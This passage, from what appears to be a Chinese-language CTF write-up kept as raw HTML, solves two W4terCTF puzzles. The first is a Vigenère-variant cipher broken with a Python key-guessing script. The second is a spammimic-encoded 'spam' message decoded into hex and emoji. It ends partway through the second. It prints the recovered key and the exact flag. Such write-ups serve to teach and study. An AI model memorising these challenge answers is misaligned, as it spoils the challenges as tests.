class=\"built_in\">print</span>(<span class=\"string\">&#x27;?&#x27;</span>,end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                key_index += <span class=\"number\">1</span></span><br><span class=\"line\">                text_index += <span class=\"number\">1</span> </span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            key_char = key[key_index % key_length].upper()</span><br><span class=\"line\">            key_offset = <span class=\"built_in\">ord</span>(key_char) - <span class=\"number\">65</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> char.isupper():</span><br><span class=\"line\">                base = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                base = <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (text_index + <span class=\"number\">1</span>) % <span class=\"number\">2</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">                out = []</span><br><span class=\"line\">                <span class=\"keyword\">for</span> ori <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(char) == (ori + text_index * key_offset) % <span class=\"number\">26</span> + base:</span><br><span class=\"line\">                        out.append(<span class=\"built_in\">chr</span>(ori+base))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(out) == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;()&#x27;</span>, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> <span class=\"built_in\">len</span>(out) == <span class=\"number\">1</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(out[<span class=\"number\">0</span>], end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(out, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                out = []</span><br><span class=\"line\">                <span class=\"keyword\">for</span> ori <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">26</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">ord</span>(char) == (ori - text_index * key_offset) % <span class=\"number\">26</span> + base:</span><br><span class=\"line\">                        out.append(<span class=\"built_in\">chr</span>(ori+base))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(out) == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;()&#x27;</span>, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> <span class=\"built_in\">len</span>(out) == <span class=\"number\">1</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(out[<span class=\"number\">0</span>], end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(out, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># ciphertext += encrypted_char</span></span><br><span class=\"line\">            key_index += <span class=\"number\">1</span></span><br><span class=\"line\">            text_index += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(char, end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">length = random.randint(<span class=\"number\">10</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">arr = [[<span class=\"string\">&#x27;K&#x27;</span>, <span class=\"string\">&#x27;X&#x27;</span>],</span><br><span class=\"line\">       [<span class=\"string\">&#x27;O&#x27;</span>],</span><br><span class=\"line\">       [<span class=\"string\">&#x27;J&#x27;</span>, <span class=\"string\">&#x27;W&#x27;</span>],</span><br><span class=\"line\">       [<span class=\"string\">&#x27;J&#x27;</span>],</span><br><span class=\"line\">       [<span class=\"string\">&#x27;H&#x27;</span>, <span class=\"string\">&#x27;U&#x27;</span>],</span><br><span class=\"line\">       [<span class=\"string\">&#x27;O&#x27;</span>],</span><br><span class=\"line\">       [<span class=\"string\">&#x27;G&#x27;</span>, <span class=\"string\">&#x27;T&#x27;</span>]]</span><br><span class=\"line\">random_key_arr = []</span><br><span class=\"line\">random_key = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">try_idx</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> random_key, random_key_arr</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i == <span class=\"built_in\">len</span>(arr):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(random_key)</span><br><span class=\"line\">        decrypt_vigenere_variant(recv, random_key)</span><br><span class=\"line\">        <span class=\"comment\"># print(f&#x27;&#123;decrypted&#125;&#x27;)</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n------------&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> arr[i]:</span><br><span class=\"line\">        random_key_arr.append(x)</span><br><span class=\"line\">        random_key = <span class=\"string\">&#x27;&#x27;</span>.join(random_key_arr)</span><br><span class=\"line\">        try_idx(i+<span class=\"number\">1</span>)</span><br><span class=\"line\">        random_key_arr.pop(<span class=\"built_in\">len</span>(random_key_arr)-<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(random_key)</span></span><br><span class=\"line\"></span><br><span class=\"line\">lkey = <span class=\"built_in\">len</span>(arr)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;len(key)=<span class=\"subst\">&#123;i&#125;</span>&quot;</span>)</span><br><span class=\"line\">    mod = start % i</span><br><span class=\"line\">    old_arr = arr.copy()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(mod):</span><br><span class=\"line\">        arr.insert(<span class=\"number\">0</span>,[<span class=\"string\">&#x27;?&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(arr) &lt; i:</span><br><span class=\"line\">        arr.append([<span class=\"string\">&#x27;?&#x27;</span>])</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(arr) == i:</span><br><span class=\"line\">        try_idx(<span class=\"number\">0</span>)</span><br><span class=\"line\">    arr=old_arr</span><br></pre></td></tr></table></figure></p>\n<p>运行后的输出比较长，需要人工筛选出合理的，即在里面找到一篇文章，已完全解密的单词都是合法的单词</p>\n<p>可以发现，密钥长度为 13 时，大多数已解密的单词都是合法的</p>\n<p>密钥为  <code>??KOWJHOG????</code>  时解密效果最好，结果为：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">??ilx! In vi??, ? ???ble vaud??????an veter??, ???? vicario???? ?? both vic??? ??? villain ?? ??? ?icissit???? ?? Fate. Thi? ?????e, no mere ?????? of Vanit?, ?? ?? ?estige o? ??? ??x populi, ??? ???ant, Vani????, ?? the once ????? ?oice of t?? ????similit??? ??? Venerat?? ???? they onc? ?????ied. Howe???, ???s Valoro?? ????tation o? ? ??-??ne Vexat???, ???nds Vivi????, ??d has Vow?? ?? ??nquish t???? ??nal and V??????t Vermin ??????rd-ing Vi?? ??? ?ouchsaf??? ??? Violent?? ????ous and V??????us Viola???? ?? Volitio?. ?????t this Vo???? ?? Verbosi??, ? ???led Vest??? ?? ?indicat??? ???rges: a Va?????? W4terCTF&#123;??????H_Th3_mASk_???3?3??_5TRlK3S_84Ck_????_?3?934nc3&#125;, yet Vi??????s Vector ??? ???tory. The ???? ??rdict is ??????nce; a Ven?????, ?eld as a V?????, ?ot in Vai?, ??? ??e Value a?? ????city of s??? ???ll one da? ?????cate the ??????nt and th? ?????ous. Veri??, ???? Vichyss???? ?? Verbiag? ????? most Ver????, ??t within ??? ???umes lie? ??? ??brant Vo??? ?? ?alidati??. ?? ??is Vein, i? ?? ?? ?ery good ????? ?o meet yo? ??? ??u may cal? ?? ?.</span><br></pre></td></tr></table></figure></p>\n<p>可以大胆猜测，其中的 <code>Howe???, ???s</code>  原文是 However, this，重复上面的操作，尝试逆推出密钥的另一部分</p>\n<p>以下可以复用上面的代码，可以推测更长的密钥片段：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[[<span class=\"string\">&#x27;K&#x27;</span>, <span class=\"string\">&#x27;X&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;O&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;J&#x27;</span>, <span class=\"string\">&#x27;W&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;J&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;H&#x27;</span>, <span class=\"string\">&#x27;U&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;O&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;G&#x27;</span>, <span class=\"string\">&#x27;T&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;W&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;C&#x27;</span>, <span class=\"string\">&#x27;P&#x27;</span>],</span><br><span class=\"line\"> [<span class=\"string\">&#x27;G&#x27;</span>],</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></p>\n<p>然后用更长的密钥片段尝试解密原文，筛选出其中有效的如下</p>\n<p>密钥为 <code>??KOWJHOGWPG?</code></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">??ilx! In view, a ???ble vaudevi???an veteran, c??? vicariousl? ?? both victim ??? villain by t?? ?icissitude? ?? Fate. This Vi???e, no mere Ven??? of Vanity, is ?? ?estige of th? ??x populi, now ???ant, Vanishe?, ?? the once Vit?? ?oice of the V???similitude ??? Venerates w??? they once Vi???ied. However, ???s Valorous V???tation of a b?-??ne Vexation, ???nds Vivifie?, ??d has Vowed t? ??nquish thes? ??nal and Viru???t Vermin van???rd-ing Vice a?? ?ouchsafing ??? Violently V???ous and Vora???us Violatio? ?? Volition. Am???t this Vorte? ?? Verbosity, a ???led Vestige ?? ?indication ???rges: a Varia??? W4terCTF&#123;bEn???H_Th3_mASk_vIG3?3??_5TRlK3S_84Ck_WiT?_?3?934nc3&#125;, yet Vivac???s Vector for ???tory. The onl? ??rdict is Ven???nce; a Vendet??, ?eld as a Voti??, ?ot in Vain, fo? ??e Value and V???city of such ???ll one day Vi???cate the Vig???nt and the Vi???ous. Verily, t??? Vichyssois? ?? Verbiage Ve??? most Verbos?, ??t within its ???umes lies th? ??brant Voice ?? ?alidation. I? ??is Vein, it is ?? ?ery good hon?? ?o meet you an? ??u may call me ?.</span><br></pre></td></tr></table></figure></p>\n<p>继续重复上面的操作 1-2 次，得到真正的密钥和原文</p>\n<p>密钥 <code>BYKOWJHOGWPGG</code></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Voilx! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate. This Visage, no mere Veneer of Vanity, is it Vestige of the Vox populi, now Vacant, Vanished, as the once Vital Voice of the Verisimilitude now Venerates what they once Vilified. However, this Valorous Visitation of a by-gone Vexation, stands Vivified, and has Vowed to Vanquish these Venal and Virulent Vermin vanguard-ing Vice and Vouchsafing the Violently Vicious and Voracious Violation of Volition. Amidst this Vortex of Verbosity, a Veiled Vestige of Vindication emerges: a Variable W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;, yet Vivacious Vector for Victory. The only Verdict is Vengeance; a Vendetta, held as a Votive, not in Vain, for the Value and Veracity of such shall one day Vindicate the Vigilant and the Virtuous. Verily, this Vichyssoise of Verbiage Veers most Verbose, yet within its Volumes lies the Vibrant Voice of Validation. In this Vein, it is my Very good honor to meet you and you may call me V.</span><br></pre></td></tr></table></figure></p>\n<p>拿到 flag</p>\n<p><code>W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;</code></p>\n<h2 id=\"spam-2024\"><a class=\"anchor\" href=\"#spam-2024\">#</a> Spam 2024</h2>\n<p>下载得到一篇很长的垃圾邮件</p>\n<p>参考资料：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5ydHNlYy5jbi9kLzExNi1nb25nLWZhbmctc2hpLWppZS1jcnlwdG8tamktY2h1LXRpLW11LWNyeXB0b2xhLWppLXlvdS1qaWFu\">https://forum.rtsec.cn/d/116-gong-fang-shi-jie-crypto-ji-chu-ti-mu-cryptola-ji-you-jian</span></p>\n<p>使用 https://www.spammimic.com/，Decode 正文部分，得到</p>\n<p><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">59</span>,<span class=\"number\">6</span>f,<span class=\"number\">75</span>,<span class=\"number\">20</span>,<span class=\"number\">6</span>c,<span class=\"number\">69</span>,<span class=\"number\">6</span>b,<span class=\"number\">65</span>,<span class=\"number\">20</span>,<span class=\"number\">65</span>,<span class=\"number\">6</span>d,<span class=\"number\">6</span>f,<span class=\"number\">6</span>a,<span class=\"number\">69</span>,<span class=\"number\">73</span>,<span class=\"number\">2</span>c,<span class=\"number\">20</span>,<span class=\"number\">64</span>,<span class=\"number\">6</span>f,<span class=\"number\">6</span>e,<span class=\"number\">27</span>,<span class=\"number\">74</span>,<span class=\"number\">20</span>,<span class=\"number\">79</span>,<span class=\"number\">6</span>f,<span class=\"number\">75</span>,<span class=\"number\">3</span>f,<span class=\"number\">0</span>a,<span class=\"number\">0</span>a,<span class=\"number\">01</span>f643,<span class=\"number\">01</span>f4b5,<span class=\"number\">01</span>f33f,<span class=\"number\">01</span>f3a4,<span class=\"number\">01</span>f6aa,<span class=\"number\">01</span>f30f,<span class=\"number\">01</span>f40e,<span class=\"number\">01</span>f94b,<span class=\"number\">01</span>f6ab,<span class=\"number\">01</span>f606,<span class=\"number\">2705</span>,<span class=\"number\">01</span>f606,<span class=\"number\">01</span>f6b0,<span class=\"number\">01</span>f4c2,<span class=\"number\">01</span>f32a,<span class=\"number\">263</span>a,<span class=\"number\">01</span>f6e9,<span class=\"number\">01</span>f30f,<span class=\"number\">01</span>f4c2,<span class=\"number\">01</span>f579,<span class=\"number\">01</span>f993,<span class=\"number\">01</span>f405,<span class=\"number\">01</span>f375,<span class=\"number\">01</span>f388,<span class=\"number\">01</span>f600,<span class=\"number\">01</span>f504,<span class=\"number\">01</span>f6ab,<span class=\"number\">01</span>f3a4,<span class=\"number\">01</span>f993,<span class=\"number\">2705</span>,<span class=\"number\">01</span>f4ee,<span class=\"number\">01</span>f3a4,<span class=\"number\">01</span>f385,<span class=\"number\">01</span>f34e,<span class=\"number\">01</span>f643,<span class=\"number\">01</span>f309,<span class=\"number\">01</span>f383,<span class=\"number\">01</span>f34d,<span class=\"number\">01</span>f374,<span class=\"number\">01</span>f463,<span class=\"number\">01</span>f6b9,<span class=\"number\">01</span>f923,<span class=\"number\">01</span>f418,<span class=\"number\">01</span>f3f9,<span class=\"number\">263</span>a,<span class=\"number\">01</span>f463,<span class=\"number\">01</span>f4a7,<span class=\"number\">01</span>f463,<span class=\"number\">01</span>f993,<span class=\"number\">01</span>f33f,<span class=\"number\">2328</span>,<span class=\"number\">01</span>f32a,<span class=\"number\">01</span>f30f,<span class=\"number\">01</span>f643,<span class=\"number\">01</span>f375,<span class=\"number\">2753</span>,<span class=\"number\">2602</span>,<span class=\"number\">01</span>f309,<span class=\"number\">01</span>f606,<span class=\"number\">01</span>f3f9,<span class=\"number\">01</span>f375,<span class=\"number\">01</span>f4a7,<span class=\"number\">01</span>f385,<span class=\"number\">01</span>f449,<span class=\"number\">01</span>f30a,<span class=\"number\">01</span>f6b9,<span class=\"number\">01</span>f6aa,<span class=\"number\">01</span>f374,<span class=\"number\">01</span>f60e,<span class=\"number\">01</span>f383,<span class=\"number\">01</span>f32a,<span class=\"number\">01</span>f643,<span class=\"number\">01</span>f441,<span class=\"number\">01</span>f94b,<span class=\"number\">01</span>f451,<span class=\"number\">01</span>f4a7,<span class=\"number\">01</span>f418,<span class=\"number\">01</span>f3a4,<span class=\"number\">01</span>f94b,<span class=\"number\">01</span>f418,<span class=\"number\">01</span>f6e9,<span class=\"number\">01</span>f923,<span class=\"number\">01</span>f309,<span class=\"number\">01</span>f6e9,<span class=\"number\">23</span>e9,<span class=\"number\">01</span>f60d,<span class=\"number\">2753</span>,<span class=\"number\">01</span>f418,<span class=\"number\">01</span>f621,<span class=\"number\">2600</span>,<span class=\"number\">01</span>f60d,<span class=\"number\">01</span>f643,<span class=\"number\">01</span>f601,<span class=\"number\">01</span>f600,<span class=\"number\">01</span>f601,<span class=\"number\">01</span>f6ab,<span class=\"number\">01</span>f4c2,<span class=\"number\">2705</span>,<span class=\"number\">2603</span>,<span class=\"number\">01</span>f6ab,<span class=\"number\">01</span>f60e,<span class=\"number\">01</span>f52a,<span class=\"number\">01</span>f451,<span class=\"number\">01</span>f600,<span class=\"number\">01</span>f579,<span class=\"number\">01</span>f6ab,<span class=\"number\">01</span>f60d,<span class=\"number\">01</span>f32a,<span class=\"number\">01</span>f4c2,<span class=\"number\">01</span>f44c,<span class=\"number\">01</span>f34d,<span class=\"number\">01</span>f44c,<span class=\"number\">01</span>f993,<span class=\"number\">01</span>f590,<span class=\"number\">01</span>f923,<span class=\"number\">01</span>f60e,<span class=\"number\">01</span>f3ce,<span class=\"number\">01</span>f34d,<span class=\"number\">01</span>f3f9,<span class=\"number\">01</span>f34c,<span class=\"number\">01</span>f34d,<span class=\"number\">01</span>f3a4,<span class=\"number\">2600</span>,<span class=\"number\">01</span>f3f9,<span class=\"number\">01</span>f388,<span class=\"number\">01</span>f6b0,<span class=\"number\">01</span>f4a7,<span class=\"number\">2600</span>,<span class=\"number\">2709</span>,<span class=\"number\">01</span>f3f9,<span class=\"number\">01</span>f34d,<span class=\"number\">01</span>f993,<span class=\"number\">01</span>f385,<span class=\"number\">01</span>f374,<span class=\"number\">2602</span>,<span class=\"number\">23</span>e9,<span class=\"number\">01</span>f6aa,<span class=\"number\">01</span>f40d,<span class=\"number\">263</span>a,<span class=\"number\">01</span>f418,<span class=\"number\">01</span>f607,<span class=\"number\">01</span>f621,<span class=\"number\">01</span>f375,<span class=\"number\">01</span>f30f,<span class=\"number\">01</span>f993,<span class=\"number\">01</span>f375,<span class=\"number\">01</span>f6e9,<span class=\"number\">01</span>f4c2,<span class=\"number\">01</span>f44c,<span class=\"number\">01</span>f3f9,<span class=\"number\">01</span>f5d2,<span class=\"number\">01</span>f5d2,<span class=\"number\">0</span>a,<span class=\"number\">0</span>a,<span class=\"number\">42</span>,<span class=\"number\">74</span>,<span class=\"number\">77</span>,<span class=\"number\">2</span>c,<span class=\"number\">20</span>,<span class=\"number\">74</span>,<span class=\"number\">68</span>,<span class=\"number\">65</span>,<span class=\"number\">20</span>,<span class=\"number\">6</span>b,<span class=\"number\">65</span>,<span class=\"number\">79</span>,<span class=\"number\">20</span>,<span class=\"number\">69</span>,<span class=\"number\">73</span>,<span class=\"number\">20</span>,<span class=\"number\">22</span>,<span class=\"number\">4</span>b,<span class=\"number\">45</span>,<span class=\"number\">59</span>,<span class=\"number\">22</span></span><br></pre></td></tr></table></figure></p>\n<p>From HEX</p>\n<p><figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You <span class=\"built_in\">like</span> emojis, don<span class=\"comment\">&#x27;t you?</span></span><br><span class=\"line\">(乱码)</span><br><span class=\"line\">Btw, the <span class=\"keyword\">key</span> <span class=\"built_in\">is</span> <span class=\"string\">&quot;KEY&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>逗号换成 \\u</p>\n<p><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\u59\\u6f\\u75\\u20\\u6c\\u69\\u6b\\u65\\u20\\u65\\u6d\\u6f\\u6a\\u69\\u73\\u2c\\u20\\u64\\u6f\\u6e\\u27\\u74\\u20\\u79\\u6f\\u75\\u3f\\u0a\\u0a<span class=\"symbol\">\\u01f6</span>43<span class=\"symbol\">\\u01f4</span>b5<span class=\"symbol\">\\u01f3</span>3f<span class=\"symbol\">\\u01f3</span>a4<span class=\"symbol\">\\u01f6</span>aa<span class=\"symbol\">\\u01f3</span>0f<span class=\"symbol\">\\u01f4</span>0e<span class=\"symbol\">\\u01f9</span>4b<span class=\"symbol\">\\u01f6</span>ab<span class=\"symbol\">\\u01f6</span>06<span class=\"symbol\">\\u2705</span><span class=\"symbol\">\\u01f6</span>06<span class=\"symbol\">\\u01f6</span>b0<span class=\"symbol\">\\u01f4</span>c2<span class=\"symbol\">\\u01f3</span>2a<span class=\"symbol\">\\u263a</span><span class=\"symbol\">\\u01f6</span>e9<span class=\"symbol\">\\u01f3</span>0f<span class=\"symbol\">\\u01f4</span>c2<span class=\"symbol\">\\u01f5</span>79<span class=\"symbol\">\\u01f9</span>93<span class=\"symbol\">\\u01f4</span>05<span class=\"symbol\">\\u01f3</span>75<span class=\"symbol\">\\u01f3</span>88<span class=\"symbol\">\\u01f6</span>00<span class=\"symbol\">\\u01f5</span>04<span class=\"symbol\">\\u01f6</span>ab<span class=\"symbol\">\\u01f3</span>a4<span class=\"symbol\">\\u01f9</span>93<span class=\"symbol\">\\u2705</span><span class=\"symbol\">\\u01f4</span>ee<span class=\"symbol\">\\u01f3</span>a4<span class=\"symbol\">\\u01f3</span>85<span class=\"symbol\">\\u01f3</span>4e<span class=\"symbol\">\\u01f6</span>43<span class=\"symbol\">\\u01f3</span>09<span class=\"symbol\">\\u01f3</span>83<span class=\"symbol\">\\u01f3</span>4d<span class=\"symbol\">\\u01f3</span>74<span class=\"symbol\">\\u01f4</span>63<span class=\"symbol\">\\u01f6</span>b9<span class=\"symbol\">\\u01f9</span>23<span class=\"symbol\">\\u01f4</span>18<span class=\"symbol\">\\u01f3</span>f9<span class=\"symbol\">\\u263a</span><span class=\"symbol\">\\u01f4</span>63<span class=\"symbol\">\\u01f4</span>a7<span class=\"symbol\">\\u01f4</span>63<span class=\"symbol\">\\u01f9</span>93<span class=\"symbol\">\\u01f3</span>3f<span class=\"symbol\">\\u2328</span><span class=\"symbol\">\\u01f3</span>2a<span class=\"symbol\">\\u01f3</span>0f<span class=\"symbol\">\\u01f6</span>43<span class=\"symbol\">\\u01f3</span>75<span class=\"symbol\">\\u2753</span><span class=\"symbol\">\\u2602</span><span class=\"symbol\">\\u01f3</span>09<span class=\"symbol\">\\u01f6</span>06<span class=\"symbol\">\\u01f3</span>f9<span class=\"symbol\">\\u01f3</span>75<span class=\"symbol\">\\u01f4</span>a7<span class=\"symbol\">\\u01f3</span>85<span class=\"symbol\">\\u01f4</span>49<span class=\"symbol\">\\u01f3</span>0a<span class=\"symbol\">\\u01f6</span>b9<span class=\"symbol\">\\u01f6</span>aa<span class=\"symbol\">\\u01f3</span>74<span class=\"symbol\">\\u01f6</span>0e<span class=\"symbol\">\\u01f3</span>83<span class=\"symbol\">\\u01f3</span>2a<span class=\"symbol\">\\u01f6</span>43<span class=\"symbol\">\\u01f4</span>41<span class=\"symbol\">\\u01f9</span>4b<span class=\"symbol\">\\u01f4</span>51<span class=\"symbol\">\\u01f4</span>a7<span class=\"symbol\">\\u01f4</span>18<span class=\"symbol\">\\u01f3</span>a4<span class=\"symbol\">\\u01f9</span>4b<span class=\"symbol\">\\u01f4</span>18<span class=\"symbol\">\\u01f6</span>e9<span class=\"symbol\">\\u01f9</span>23<span class=\"symbol\">\\u01f3</span>09<span class=\"symbol\">\\u01f6</span>e9<span class=\"symbol\">\\u23e9</span><span class=\"symbol\">\\u01f6</span>0d<span class=\"symbol\">\\u2753</span><span class=\"symbol\">\\u01f4</span>18<span class=\"symbol\">\\u01f6</span>21<span class=\"symbol\">\\u2600</span><span class=\"symbol\">\\u01f6</span>0d<span class=\"symbol\">\\u01f6</span>43<span class=\"symbol\">\\u01f6</span>01<span class=\"symbol\">\\u01f6</span>00<span class=\"symbol\">\\u01f6</span>01<span class=\"symbol\">\\u01f6</span>ab<span class=\"symbol\">\\u01f4</span>c2<span class=\"symbol\">\\u2705</span><span class=\"symbol\">\\u2603</span><span class=\"symbol\">\\u01f6</span>ab<span class=\"symbol\">\\u01f6</span>0e<span class=\"symbol\">\\u01f5</span>2a<span class=\"symbol\">\\u01f4</span>51<span class=\"symbol\">\\u01f6</span>00<span class=\"symbol\">\\u01f5</span>79<span class=\"symbol\">\\u01f6</span>ab<span class=\"symbol\">\\u01f6</span>0d<span class=\"symbol\">\\u01f3</span>2a<span class=\"symbol\">\\u01f4</span>c2<span class=\"symbol\">\\u01f4</span>4c<span class=\"symbol\">\\u01f3</span>4d<span class=\"symbol\">\\u01f4</span>4c<span class=\"symbol\">\\u01f9</span>93<span class=\"symbol\">\\u01f5</span>90<span class=\"symbol\">\\u01f9</span>23<span class=\"symbol\">\\u01f6</span>0e<span class=\"symbol\">\\u01f3</span>ce<span class=\"symbol\">\\u01f3</span>4d<span class=\"symbol\">\\u01f3</span>f9<span class=\"symbol\">\\u01f3</span>4c<span class=\"symbol\">\\u01f3</span>4d<span class=\"symbol\">\\u01f3</span>a4<span class=\"symbol\">\\u2600</span><span class=\"symbol\">\\u01f3</span>f9<span class=\"symbol\">\\u01f3</span>88<span class=\"symbol\">\\u01f6</span>b0<span class=\"symbol\">\\u01f4</span>a7<span class=\"symbol\">\\u2600</span><span class=\"symbol\">\\u2709</span><span class=\"symbol\">\\u01f3</span>f9<span class=\"symbol\">\\u01f3</span>4d<span class=\"symbol\">\\u01f9</span>93<span class=\"symbol\">\\u01f3</span>85<span class=\"symbol\">\\u01f3</span>74<span class=\"symbol\">\\u2602</span><span class=\"symbol\">\\u23e9</span><span class=\"symbol\">\\u01f6</span>aa<span class=\"symbol\">\\u01f4</span>0d<span class=\"symbol\">\\u263a</span><span class=\"symbol\">\\u01f4</span>18<span class=\"symbol\">\\u01f6</span>07<span class=\"symbol\">\\u01f6</span>21<span class=\"symbol\">\\u01f3</span>75<span class=\"symbol\">\\u01f3</span>0f<span class=\"symbol\">\\u01f9</span>93<span class=\"symbol\">\\u01f3</span>75<span class=\"symbol\">\\u01f6</span>e9<span class=\"symbol\">\\u01f4</span>c2<span class=\"symbol\">\\u01f4</span>4c<span class=\"symbol\">\\u01f3</span>f9<span class=\"symbol\">\\u01f5</span>d2<span class=\"symbol\">\\u01f5</span>d2\\u0a\\u0a\\u42\\u74\\u77\\u2c\\u20\\u74\\u68\\u65\\u20\\u6b\\u65\\u79\\u20\\u69\\u73\\u20\\u22\\u4b\\u45\\u59\\u22</span><br></pre></td></tr></table></figure></p>\n<p>把这个放到 https://www.ifreesite.com/unicode/，得到</p>\n<p><figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You <span class=\"built_in\">like</span> emojis, don<span class=\"comment\">&#x27;t you?</span></span><br><span class=\"line\"></span><br><span 